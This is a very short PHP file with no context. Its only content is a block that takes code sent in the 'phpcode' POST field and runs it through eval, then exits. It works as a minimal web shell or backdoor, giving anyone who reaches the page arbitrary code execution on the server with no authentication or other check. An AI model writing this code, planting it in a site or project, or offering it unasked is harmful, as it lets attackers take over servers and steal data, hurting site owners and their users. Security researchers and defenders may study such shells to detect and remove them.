<?php
if(isset($_POST['phpcode'])){
	eval("?".">$_POST[phpcode]<?");
	exit;
}
?>